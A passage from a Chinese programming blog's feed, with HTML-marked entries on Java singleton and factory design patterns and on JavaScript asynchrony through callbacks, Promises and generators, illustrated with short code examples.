class="title">Singleton</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">private</span> Singleton instance = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125; </span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">      instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> instance;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，为了限制客户端对该对象的多次实例化，两者的 constructor 均被设置为 private 可见性，并对外暴露静态方法 getInstance 用于返回内部的实例。区别在于，懒汉单例应用了 lazy loading 的思想，使得 instance 的实例化延迟到 getInstance 方法真正被调用时；而饿汉单例借助了 ClassLoader 的能力，让 instance 的实例化在 Singleton 类被加载时便进行了。</p><h1 id="0x2-懒汉单例与线程安全"><a href="#0x2-懒汉单例与线程安全" class="headerlink" title="0x2 懒汉单例与线程安全"></a>0x2 懒汉单例与线程安全</h1><p>就像上面的注释所言，上述形式的懒汉模式并不是线程安全的，原因在于 <code>instance == null</code> 这句判断在并发的场景下是非常靠不住的，比如如下的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">        Singleton.getInstance();</span><br><span class="line">      &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">private</span> Singleton instance = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"An instance has been created"</span>);</span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">      instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> instance;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在笔者的设备上共输出了5次 <code>An instance has been created</code> ，也就是产生了5个不同的对象，这并不符合单例模式。</p><p>针对上述问题，可以通过 synchronized 关键字对代码进行加锁，从而在保证线程安全的条件下实现懒汉单例。</p>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>设计模式之工厂模式</title>
      <link href="/2020/11/05/DesignPattern-FactoryPattern/"/>
      <url>/2020/11/05/DesignPattern-FactoryPattern/</url>
      
        <content type="html"><![CDATA[<h1 id="0x0-简单（静态）工厂模式"><a href="#0x0-简单（静态）工厂模式" class="headerlink" title="0x0 简单（静态）工厂模式"></a>0x0 简单（静态）工厂模式</h1><p>一般来说，OOP语言中获取对象的实例都是通过 new 关键字来调用对象的 constructor，从而将实例传递给某个引用或是具体的左值。constructor 根据特征标的不同来进行重载，以达到按需构建对象的目的。</p><p>但是这里有个问题，对象的初始化工作均交给了 constructor 来完成，这使得其代码往往变得很长，同时，把一些面向某个类而不是某个实例的操作（比如对实例在其类的内部用静态字段进行计数）写在 consturctor 中也不是很优雅。</p><p>更进一步的，像 Java 的 IO 操作中采用了 Filter 模式，这使得一个具备缓冲功能的 FileReader 看起来像这样：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Reader bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(<span class="keyword">new</span> File(...)))</span><br></pre></td></tr></table></figure><p>如果每次产生这类对象时都这样写，虽然在业务上没什么问题，但是并不利于维护。比如假设突然有了把所有的 Reader 都变成 LineNumberReader 的需求的话，就要修改所有实例的 new 部分。</p><p>简单工厂模式就可以很好地解决上述这些问题。</p><p>要实现简单工厂模式，最基本的是需要一个工厂类，对于上述的 Reader，可以得到如下工厂：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ReaderFactory</span> </span>&#123;</span><br><span class="line">  <span class="comment">// constructor 设置为 private，因为这个工厂内部只需要静态方法即可</span></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="title">ReaderFactory</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Reader <span class="title">createReaderForFile</span><span class="params">(String filename)</span></span></span><br><span class="line"><span class="function">  <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(<span class="keyword">new</span> File(filename)));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样在要获得 Reader 时，可以写类似 <code>Reader bufferedReader = ReaderFactory.createReaderForFile(...)</code> 的代码，而在日后遇到需要修改为 LineNumberReader 的维护需求时，只需要修改工厂中的代码即可。</p><p>这里可以发现，由于 Reader 们都实现了Reader 这个抽象类，所以利用多态的特性，返回的实例可以是任意的子类，那么实际上可以将工厂的生产方法修改为可以根据需求返回不同子类的形式，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ReaderFactory</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="title">ReaderFactory</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Reader <span class="title">createReaderForFile</span><span class="params">(String filename, String readerType)</span></span></span><br><span class="line"><span class="function">  <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line">    Reader fileReader = <span class="keyword">new</span> FileReader(<span class="keyword">new</span> File(filename));</span><br><span class="line">    <span class="keyword">switch</span> (readerType) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"BufferedReader"</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> BufferedReader(fileReader);</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"LineNumberReader"</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> LineNumberReader(fileReader);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> fileReader;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，在客户端调用工厂的生产方法时，通过提供第二个参数即可获得不同功能的 Reader 对象。</p><p>虽然多数设计模式的书籍或文章在阐述某个模式时都会使用 Java 作为实现语言，但设计模式本身是作用于 OOP 的理念上，所以其他语言中也都有设计模式的身影。对于简单工厂模式，Vue 在使用 rollup 打包后产生的代码（通过结合立即执行表达式IIFE和闭包），我个人认为就是它的一个实现。</p><p>所以，简单工厂模式封装了一部分类的初始化行为，并可以提供按需构建不同子类的功能。这种模式方便了客户端代码（即使用工厂的代码），使其并不需要考虑工厂的具体实现，而只是按需为工厂传递参数即可。</p><h1 id="0x1-工厂方法模式"><a href="#0x1-工厂方法模式" class="headerlink" title="0x1 工厂方法模式"></a>0x1 工厂方法模式</h1><p>虽然简单工厂模式方便了客户端代码，但是由于每次对功能的扩展都要修改工厂的内部代码，不但违反了“开放-封闭原则”，同时在工厂生产方法很大时，每次都要编译许多无关的代码，增大了开发的成本。</p><p>工厂方法模式就可以很好地解决上述问题。</p><p>为了举例，假设我们有一个 Pet 的接口，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Pet</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">say</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在分别定义猫和狗实体类来实现该接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span> <span class="keyword">implements</span> <span class="title">Pet</span> </span>&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">say</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"喵"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">implements</span> <span class="title">Pet</span> </span>&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">say</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"汪"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了按需获取 Pet 的实例，我们可以定义 PetFactory 工厂：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PetFactory</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="title">PetFactory</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> Pet DEFAULT_PET = <span class="keyword">new</span> Pet() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">say</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      System.out.println(<span class="string">"Idk who am I"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Pet <span class="title">createPet</span><span class="params">(String petType)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (petType) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"Cat"</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> Cat();</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"Dog"</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> Dog();</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> DEFAULT_PET;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就是简单工厂模式的一个实现，那么按照上面所说的问题，假设现在要新添加一个 Pet 实体，除了添加一个实现了 Pet 接口的类以外，另要修改 PetFactory.createPet 方法中的 switch。</p><p>那么同样的需求，如果用工厂方法模式来实现会是什么样呢？</p><p>首先，需要把 PetFactory 从类转为接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">PetFactory</span> </span>&#123;</span><br><span class="line">  <span class="function">Pet <span class="title">createPet</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后针对 Cat 和 Dog 分别实现其工厂：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这里因为逻辑很简单，所以工厂的生产方法只是简单返回实体</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CatFactory</span> <span class="keyword">implements</span> <span class="title">PetFactory</span> </span>&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> Pet <span class="title">createPet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Cat();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DogFactory</span> <span class="keyword">implements</span> <span class="title">PetFactory</span> </span>&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> Pet <span class="title">createPet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Dog();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，客户端的代码可以这样写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">  PetFactory catFactory = <span class="keyword">new</span> CatFactory();</span><br><span class="line">  PetFactory dogFactory = <span class="keyword">new</span> DogFactory();</span><br><span class="line">  catFactory.createPet().say();</span><br><span class="line">  dogFactory.createPet().say();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在定义工厂的引用时，类型可直接定义为 PetFactory 接口，然后利用多态的特性来分发具体的工厂。这样一来，我们<strong>定义了一个用于创建对象的接口，让子类来决定实例化哪一个类。工厂方法使一个类的实例化延迟到其子类</strong>。</p><p>和简单工厂模式不同的是，工厂方法模式的客户端做了更多的工作，它需要知道某个实体类对应的具体工厂类。同时，在对实体类的种类进行扩展时，要同时定义这个新的实体类和其对应的工厂类。这样的缺点在于代码量比较大，修改的工作相对于简单工厂模式而言稍有复杂，而优点则在于解决了之前说的问题。即，遵循了“封闭-开放原则”，同时，通过添加新的类而不是修改原有的类来进行业务的扩展，使得按需编译成为可能，减少了开发的成本。</p><h1 id="0x2-抽象工厂模式"><a href="#0x2-抽象工厂模式" class="headerlink" title="0x2 抽象工厂模式"></a>0x2 抽象工厂模式</h1><p>抽象工厂模式的定义是<strong>为创建一组相关或相互依赖的对象提供一个接口，并且无须指定它们的具体类</strong>，从字面意义上来理解，就可以理解为工厂方法模式的加强。也就是说，此时工厂的目标在于创建一系列相互影响或关联的实体类，我们把这些类叫做<strong>产品</strong>，而由于工厂的具体实现不同，所以同类产品也有着一定的差异，在这个横向的对比上，我们把它们叫做一个<strong>产品族</strong>。</p><p>一般来说，抽象工厂模式适用于比较大的项目。比如可以定义一套跨平台的业务接口，让工厂来生产BO们，共同配合以实现某个功能。那么针对不同的平台，就可以有不同的工厂来屏蔽平台之间的差异。而站在客户端的角度，我们只需要结合多态来实例化目标平台的工厂类，就可以通过通用的接口来完成所需的功能。在这个过程中，尽管工厂生成的产品们联系密切，但客户端依然不需要了解产品族中各产品之间的具体差异。</p><p>这即是说，抽象工厂模式把更多的工作放到了接口实现方这边。对于“功能扩展”这项工作，抽象工厂模式可以分为产品扩展和产品族扩展两种。可以发现，产品的扩展其实违背了“开放-封闭原则”，因为它不但要修改工厂接口，还要修改每个现有的工厂实现类；而产品族的扩展则十分优雅，因为抽象工厂模式主打的就是扩展产品族嘛。</p>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CallBack 与 Promise 与 Generator 与 async/await 的故事</title>
      <link href="/2020/09/29/AsyncJavascript/"/>
      <url>/2020/09/29/AsyncJavascript/</url>
      
        <content type="html"><![CDATA[<h1 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h1><p>之前在读 express 相关的项目时经常看到 async/await 关键字，所以就跑去查了一下<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/async_function" target="_blank" rel="noopener">文档</a>，看完以后还是觉得云里雾里；前几天偶然看到阮一峰老师的一篇<a href="http://caibaojian.com/es6/async.html" target="_blank" rel="noopener">文章</a>，文章中整理了当前 Javascript 处理异步的一些方式，并作了一些对比，尤其最后在提到 async/await 时使用 Generator 去模拟其行为，顿时觉得茅塞顿开。</p><p>于是这篇文章就作为一个简单的总结+个人的一些理解，就这样开始写下去了。</p><h1 id="0x1-关于-Javascript-的异步"><a href="#0x1-关于-Javascript-的异步" class="headerlink" title="0x1 关于 Javascript 的异步"></a>0x1 关于 Javascript 的异步</h1><p>之前有看到所谓 “异步就是多线程” 的言论，但是在上文提到的文章中，作者把异步看作是一种可以在两个任务中互相切换（并传递信息）的一种模式（这里的任务指按顺序执行的一段序列），那么根据这个思想，其实 Generator 的模式就可以看作是一种异步，于是它在配合 Javascript 的事件循环（Event Loop）后就可以做到一些奇妙的效果，详见下文。</p><p>众所周知，Javascript 是一门单线程的语言，这句话多少都令人有些疑惑（或者可能单纯是我比较愚钝），比如像 NodeJS 的 fs.readFile ，在 CallBack 被调用前，这个 “唯一” 的线程难道还是要自己去与文件系统交互吗；或者对于 setTimeout ，这个 “唯一” 的线程难道会通过在用户的代码中插入轮询来进行计时吗。</p><p>事实上，这里所谓的单线程指的是用户代码所在的线程（这里姑且称之为主线程），而对于计时器、文件读取这类的操作，Javascript 依然有相应的线程来完成这些任务。也就是说，用户的代码并不能进入到这些线程中来执行，但是可以通过 API 来委托它们执行任务，那么就需要一种方式，使得这些线程在执行完相应的任务后能通知到主线程，对于这种方式，首先能想到的就是 CallBack。</p><h1 id="0x2-关于-CallBack"><a href="#0x2-关于-CallBack" class="headerlink" title="0x2 关于 CallBack"></a>0x2 关于 CallBack</h1><p>CallBack 并不是专门用来解决异步问题的，它只是一个被作为参数传递给另一个函数的函数，这样看来其实像 Decorator 这种的都可以算作是一种 CallBack。</p><p>回到异步的话题上，在 Javascript 的一种异步模式中，CallBack 用于告知对应的任务线程，在执行完主线程分发的任务后调用之，从而让执行流回到主线程中。比如前文所述的 readFile，对应的代码大概如下:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; readFile &#125; = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line">readFile(..., (err, data) =&gt; &#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这里 readFile 的第二个参数就是一个 CallBack，它委托与文件系统交互的线程去读取由第一个参数指明的文件。在它执行任务的期间，有可能成功也有可能失败，所以 NodeJs 大部分的 CallBack 的第一个参数都用来记录错误，后面的则用来处理成功后获取到的数据，在我看来这是一个非常优雅的模式，它并没有什么心智负担，写起来非常自然。</p><p>但是一旦异步的操作有了前后的顺序依赖，事情就变得不尽人意了，鼎鼎大名的回调地狱（CallBack Hell）就是由此产生的，还是之前读文件的例子，比如业务一定要按照 <code>file1 -&gt; file2 -&gt; file3 -&gt; ...</code> 这样的顺序来进行的话，那么回调就会一层套用一层，最终的结果是代码变得横向发展，这是十分不美观且难以维护的状态。</p><p>于是 Promise 出现了。</p><h1 id="0x3-关于-Promise"><a href="#0x3-关于-Promise" class="headerlink" title="0x3 关于 Promise"></a>0x3 关于 Promise</h1><p>Promise 其实是一种新的回调模式，网络上有大量相关的 polyfill，看一下代码就可以明白内部的基本原理（这里特别推荐一下 <a href="https://github.com/ysmood/yaku" target="_blank" rel="noopener">yaku</a> 这个库，贺老曾对此有过很高的评价）。</p><p>这里额外说明一件事，就是虽然 Promise 在大部分的实现里都以微任务来执行，但是标准中并没有提及这件事，以至于我见过的 polyfill 基本都是用 setTimeout 来模拟的，所以在写业务的时候其实不能过分依赖这一点。</p><p>回到上面的异步顺序依赖的问题，对于那种逻辑，如果用 CallBack 来写的话，大概是这个样子:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; readFile &#125; = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"></span><br><span class="line">readFile(<span class="string">'file1'</span>, (err, data) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`File1 content: <span class="subst">$&#123;data&#125;</span>`</span>)</span><br><span class="line">  readFile(<span class="string">'file2'</span>, (err, data) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`File2 content: <span class="subst">$&#123;data&#125;</span>`</span>)</span><br><span class="line">    readFile(<span class="string">'file3'</span>, (err, data) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">`File3 content: <span class="subst">$&#123;data&#125;</span>`</span>)</span><br><span class="line">      readFile(<span class="string">'...'</span>, (err, data) =&gt; &#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这里仅仅读取了三个文件，代码的缩进就已经到了很深的程度了，而且冗余性特别大，尽管对于这个样例，错误处理的逻辑可能是完全一样的，每个回调对应的错误还是要分别处理。</p><p>而同样的逻辑，如果用 Promise 写出来是这样的:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; readFile &#125; = <span class="built_in">require</span>(<span class="string">'fs'</span>).promises</span><br><span class="line"></span><br><span class="line">readFile(<span class="string">'file1'</span>, &#123; <span class="attr">encoding</span>: <span class="string">'utf8'</span> &#125;)</span><br><span class="line">.then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`File1 content: <span class="subst">$&#123;data&#125;</span>`</span>)</span><br><span class="line">  <span class="keyword">return</span> readFile(<span class="string">'file2'</span>, &#123; <span class="attr">encoding</span>: <span class="string">'utf8'</span> &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`File2 content: <span class="subst">$&#123;data&#125;</span>`</span>)</span><br><span class="line">  <span class="keyword">return</span> readFile(<span class="string">'file3'</span>, &#123; <span class="attr">encoding</span>: <span class="string">'utf8'</span> &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`File3 content: <span class="subst">$&#123;data&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br><span class="line">.catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>可以看到，Promise 很优雅地解决了上面说的两个问题，拯救被回调地狱折磨的前辈们于水火之中。</p><h1 id="0x4-更进一步"><a href="#0x4-更进一步" class="headerlink" title="0x4 更进一步"></a>0x4 更进一步</h1><p>虽然 Promise 很优雅，可以很好地解决上面提到的问题，但是一个是因为程序员比较懒，一个是因为 Promise 写多了确实有点烦，所以大家就又开始找新的解决顺序依赖的方式。</p><p>先说为什么比较烦，上面的例子因为逻辑很简单，而且只有三个显式的顺序依赖所以可能不太明显，但是想象一下如果顺序很多，那么代码里基本上全是 then then then，一个是放眼望去基本看不出主要的逻辑，另一个是…顺序依赖其实是一个挺大众的需求，如果有一个语法糖能提供更好的支持，那真的是一件令人高兴的事情。</p><p>于是我们的主角就出场了，它叫 await ，平时只喜欢和 async 待在一起，对于具体的用法稍稍 STFW 一下就有很多，所以我比较想从 Generator + Promise 的角度来描写它，那么下面就先来说一下 Generator。</p><h1 id="0x5-关于-Generator"><a href="#0x5-关于-Generator" class="headerlink" title="0x5 关于 Generator"></a>0x5 关于 Generator</h1><p>Generator 这个概念（机制）也不是 Js 这门语言独有的，比如 Python 中就有同样的机制。在 Js 中，一个 Generator 是一个带星号的函数，内部可以通过 yield 关键字来“送出”和“接收”数据，它大概长下面的样子，这里就不详细介绍它了，具体的机制可以看相关的<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Generator" target="_blank" rel="noopener">文档</a>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> *<span class="title">ImaGenerator</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> data = <span class="keyword">yield</span> <span class="string">"Send data from generator"</span></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"Get data from main:"</span>, data)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> gen = ImaGenerator()</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Get data from generator:"</span>, gen.next().value)</span><br><span class="line">gen.next(<span class="string">"Send data from main"</span>)</span><br></pre></td></tr></table></figure><p>可能是由于代码量比较少，平时写的时候还没用实际到过这项技术，不过我还是比较感谢曾经学习了它的自己，让我能够借助它来更好地理解 